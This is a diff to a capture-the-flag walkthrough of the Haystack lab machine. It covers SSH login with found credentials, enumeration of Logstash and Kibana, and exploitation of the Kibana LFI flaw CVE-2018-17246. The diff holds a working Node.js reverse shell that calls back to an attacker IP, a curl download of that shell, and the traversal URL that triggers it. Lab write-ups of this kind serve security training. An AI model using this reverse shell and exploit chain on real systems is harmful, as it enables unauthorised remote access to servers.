@@ -95,7 +95,7 @@ user: security
 pass: spanish.is.key
 ```
 
-## Low priv shell
+## Login as Security user
 
 we used this creds to login to ssh 
 ```
@@ -111,3 +111,117 @@ uid=1000(security) gid=1000(security) grupos=1000(security) contexto=unconfined_
 [security@haystack ~]$ 
 ```
 
+## Pivoting to Kibana
+
+So i executed this command ```ps aux | grep root``` to see what processes are running as root and found 
+
+```
+root       4871  0.0  0.0      0     0 ?        S<   06:07   0:00 [xfs-reclaim/sda]
+root       4875  0.0  0.0      0     0 ?        S<   06:07   0:00 [xfs-log/sda1]
+root       4876  0.0  0.0      0     0 ?        S<   06:07   0:00 [xfs-eofblocks/s]
+root       4879  0.0  0.0      0     0 ?        S    06:07   0:00 [xfsaild/sda1]
+root       6113  0.0  0.0  62044  1084 ?        S<sl 06:07   0:00 /sbin/auditd
+root       6256  0.0  0.0  26376  1752 ?        Ss   06:07   0:00 /usr/lib/systemd/systemd-logind
+root       6370  0.7 13.5 2724972 524524 ?      SNsl 06:07   4:53 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
+```
+
+Logstash which runs with elastic search and kibana as a type of combo basically elastic search stores data and kibana visualise it and logstash uploads data on elastic search in bulk...
+
+Let's check the config files of logstash to find any sort of creds ...
+
+```
+[security@haystack logstash]$ cd /etc/logstash/conf.d/
+[security@haystack conf.d]$ ls -lha
+total 12K
+drwxrwxr-x. 2 root kibana  62 jun 24 08:12 .
+drwxr-xr-x. 3 root root   183 jun 18 22:15 ..
+-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
+-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
+-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
+[security@haystack conf.d]$ cat filter.conf 
+cat: filter.conf: Permiso denegado
+[security@haystack conf.d]$
+```
+
+uh-oh So we can't read the content unless we are either user ```kibana``` or ```root```
+
+So let's search for the kibana service which typically runs on port ```5601``` ...
+
+As netstat wasn't working i used this command ```ss -nutlp```
+
+```
+[security@haystack conf.d]$ ss -nutlp
+Netid State      Recv-Q Send-Q                    Local Address:Port                                   Peer Address:Port              
+udp   UNCONN     0      0                             127.0.0.1:323                                               *:*                  
+udp   UNCONN     0      0                                   ::1:323                                              :::*                  
+tcp   LISTEN     0      128                                   *:80                                                *:*                  
+tcp   LISTEN     0      128                                   *:9200                                              *:*                  
+tcp   LISTEN     0      128                                   *:22                                                *:*                  
+tcp   LISTEN     0      128                           127.0.0.1:5601                                              *:*                  
+tcp   LISTEN     0      128                    ::ffff:127.0.0.1:9000                                             :::*                  
+tcp   LISTEN     0      128                                  :::80                                               :::*                  
+tcp   LISTEN     0      128                    ::ffff:127.0.0.1:9300                                             :::*                  
+tcp   LISTEN     0      128                                  :::22                                               :::*                  
+tcp   LISTEN     0      50                     ::ffff:127.0.0.1:9600                                             :::*                  
+[security@haystack conf.d]$ 
+```
+
+And we can see kibana service is running on port 5601 localhost so now we shall look for any public exploits to priv esc
+
+## Pivoting to Kibana user
+
+So from quick google search ```kibana exploit``` i found [this](https://github.com/mpgn/CVE-2018-17246)
+
+#### LFI vulnerability to rce 
+
+We have to upload a node javascript reverse shell to a writable directory(*tmp*) and shell is also available on same article
+
+So my shell looked like this 
+
+```javascript
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1232, "10.10.14.4", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+```
+This will pop a shell on port ```1232``` so let's quicky send this file to ```/tmp``` directory by curl...
+
+```
+[security@haystack conf.d]$ cd /tmp
+[security@haystack tmp]$ curl http://10.10.14.4:8081/shell.js > shell.js
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   381  100   381    0     0   1032      0 --:--:-- --:--:-- --:--:--  1035
+[security@haystack tmp]$ ls
+hsperfdata_root  systemd-private-b988296bb1284929b1de3e26dcb561bd-chronyd.service-RlZfgD
+jruby-6370       systemd-private-b988296bb1284929b1de3e26dcb561bd-elasticsearch.service-hRFCKr
+shell.js         systemd-private-b988296bb1284929b1de3e26dcb561bd-nginx.service-tVzzr5
+[security@haystack tmp]$ 
+```
+Now we will trigger the LFI with this payload and we will get shell at our listener
+
+```
+curl "http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/shell.js"
+```
+and we got our shell
+
+```
+[sarthak@sarthak haystack]$ nc -nvlp 1232
+Connection from 10.10.10.115:41904
+id
+uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
+python -c 'import pty;pty.spawn("/bin/bash")'
+bash-4.2$ pwd
+pwd
+/
+```
+Now we can look at the contents of those config files...
